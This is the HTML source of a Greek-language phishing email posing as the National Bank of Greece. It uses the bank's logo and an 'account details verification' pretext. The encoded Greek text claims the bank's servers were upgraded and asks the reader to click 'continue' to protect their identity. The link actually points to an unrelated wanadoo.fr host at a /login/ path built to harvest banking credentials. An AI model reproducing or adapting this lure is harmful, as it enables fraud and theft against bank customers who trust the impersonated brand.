<table cellspacing="0" cellpadding="0" width="747" align="left" border="0">
<tbody>
<tr>
<td colspan="4" height="80"> 
<img border="0" src="http://www.ethniki.gr/images/logo.jpg" width="151" height="107"> </td></tr> 

<tr>
<td height="93" colspan="4" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0" summary=""> 
     <tr valign="top">
         <td width="700" height="75" valign="bottom">
             <div style="margin:0px;padding:0px">
				<div id="result_box0" dir="ltr">
					&#917;&#960;&#945;&#955;&#951;&#952;&#949;&#965;&#963;&#951; &#964;&#969;&#957; &#963;&#964;&#959;&#953;&#967;&#949;&#953;&#969;&#957; &#964;&#959;&#965; &#955;&#959;&#947;&#945;&#961;&#953;&#945;&#963;&#956;&#959;&#965; &#963;&#945;&#962;</div>
               <hr width="747" color="#cccccc" size="1">
             </div>
         </td>
         <td align="right" valign="bottom"> 
   <img src="https://onlineeast.bankofamerica.com/eas-docs/images/clr.gif" alt="" width="1" height="1" border="0"> 
            </td>
     </tr>
 </table></td></tr>
<tr>
<td width="1"></td>
<td valign="top" width="685"><a href="http://www.galeria.kroscienko.com/albums/userpics/10034/iindex.html" target="_blank">
 </a>
  <blockquote>
  
    <div align="right">
		<div id="result_box" dir="ltr">
			&#917;&#954;&#966;&#961;&#945;&#950;&#959;&#965;&#956;&#949; &#964;&#951; &#955;&#965;&#960;&#951; &#956;&#945;&#962; &#947;&#953;&#945; &#957;&#945; &#963;&#945;&#962; &#960;&#955;&#951;&#961;&#959;&#966;&#959;&#961;&#951;&#963;&#969; &#959;&#964;&#953; &#948;&#949;&#957; &#949;&#967;&#949;&#964;&#949; &#960;&#955;&#951;&#961;&#951; 
			&#949;&#955;&#949;&#947;&#967;&#959; &#928;&#961;&#959;&#966;&#953;&#955; &#956;&#945;&#962;. &#928;&#945;&#961;&#945;&#954;&#945;&#955;&#969; &#954;&#945;&#957;&#964;&#949; &#954;&#955;&#953;&#954; &#963;&#964;&#959;&#957; &#960;&#945;&#961;&#945;&#954;&#945;&#964;&#969; &#963;&#965;&#957;&#948;&#949;&#963;&#956;&#959; &#954;&#945;&#953; 
			&#948;&#959;&#954;&#953;&#956;&#945;&#963;&#964;&#949; &#958;&#945;&#957;&#945;. <br>
			<br>
			&#937;&#962; &#956;&#949;&#961;&#959;&#962; &#964;&#969;&#957; &#956;&#949;&#964;&#961;&#969;&#957; &#947;&#953;&#945; &#964;&#951;&#957; &#949;&#958;&#945;&#963;&#966;&#945;&#955;&#953;&#963;&#951; &#949;&#957;&#959;&#962; &#945;&#963;&#966;&#945;&#955;&#949;&#963;&#964;&#949;&#961;&#959;&#965; &#954;&#945;&#953; &#960;&#953;&#959; 
			&#945;&#963;&#966;&#945;&#955;&#949;&#962; &#960;&#949;&#961;&#953;&#946;&#945;&#955;&#955;&#959;&#957; Banking. &#917;&#967;&#959;&#965;&#956;&#949; &#945;&#957;&#945;&#948;&#953;&#945;&#961;&#952;&#961;&#969;&#956;&#949;&#957;&#951; &#956;&#945;&#962; Banking 
			servers. <br>
			<br>
			&#917;&#967;&#959;&#965;&#956;&#949; &#945;&#960;&#959;&#966;&#945;&#963;&#953;&#963;&#949;&#953; &#957;&#945; &#952;&#949;&#963;&#949;&#953; &#956;&#953;&#945; &#949;&#960;&#953;&#960;&#955;&#949;&#959;&#957; &#948;&#953;&#945;&#948;&#953;&#954;&#945;&#963;&#953;&#945; &#949;&#960;&#945;&#955;&#951;&#952;&#949;&#965;&#963;&#951;&#962; &#947;&#953;&#945; 
			&#957;&#945; &#949;&#958;&#945;&#963;&#966;&#945;&#955;&#953;&#963;&#949;&#953; &#964;&#951;&#957; &#964;&#945;&#965;&#964;&#959;&#964;&#951;&#964;&#945; &#963;&#945;&#962; &#954;&#945;&#953; &#964;&#945; &#963;&#964;&#959;&#953;&#967;&#949;&#953;&#945; &#964;&#959;&#965; &#955;&#959;&#947;&#945;&#961;&#953;&#945;&#963;&#956;&#959;&#965; 
			&#949;&#953;&#957;&#945;&#953; &#960;&#961;&#959;&#963;&#964;&#945;&#964;&#949;&#965;&#956;&#949;&#957;&#945;. <br>
			<br>
			&#928;&#945;&#961;&#945;&#954;&#945;&#955;&#969; &#954;&#945;&#957;&#964;&#949; &#954;&#955;&#953;&#954; &#960;&#945;&#957;&#969; &#963;&#965;&#957;&#949;&#967;&#953;&#963;&#964;&#949;&#953;, &#956;&#949; &#964;&#951; &#948;&#953;&#945;&#948;&#953;&#954;&#945;&#963;&#953;&#945; &#949;&#960;&#945;&#955;&#951;&#952;&#949;&#965;&#963;&#951;&#962; 
			&#954;&#945;&#953; &#957;&#945; &#948;&#953;&#945;&#963;&#966;&#945;&#955;&#953;&#963;&#949;&#953; &#964;&#953;&#962; &#960;&#955;&#951;&#961;&#959;&#966;&#959;&#961;&#953;&#949;&#962; &#964;&#959;&#965; &#923;&#959;&#947;&#945;&#961;&#953;&#945;&#963;&#956;&#959;&#965; &#963;&#945;&#962; &#949;&#953;&#957;&#945;&#953; 
			&#949;&#947;&#947;&#949;&#947;&#961;&#945;&#956;&#956;&#949;&#957;&#959;&#962; &#963;&#969;&#963;&#964;&#945; &#947;&#953;&#945; &#957;&#945; &#949;&#960;&#945;&#955;&#951;&#952;&#949;&#965;&#964;&#949;&#953;. <br>
			&#917;&#953;&#957;&#945;&#953; &#959;&#955;&#945; &#947;&#953;&#945; &#964;&#951;&#957; &#945;&#963;&#966;&#945;&#955;&#949;&#953;&#945; &#963;&#945;&#962;. <br>
			<br>
			&#917;&#965;&#967;&#945;&#961;&#953;&#963;&#964;&#969;.</div>
		<br>
		<a target="_blank" href="http://apastourelles-105-1-1-165.w217-128.abo.wanadoo.fr/login/">
		&#931;&#933;&#925;&#917;&#935;&#921;&#918;&#927;&#933;&#924;&#917;</a> <br> 
      
  </div>
<td style="font-size:100%"> 
</td>
      </blockquote></td>
<td width="34"></td>
<td valign="top" width="28"> 
<p> </p>
<span style="font-size:14pt;color:#d4001a;font-family:Verdana">
<p><span style="font-size:9pt;color:#333333;font-family:Verdana"><b>  </b> 
<p><span style="font-size:9pt;color:#405ebe;font-family:Verdana">
  <br>
<p> </p></span></p></span></p></span></td></tr>

</html> 

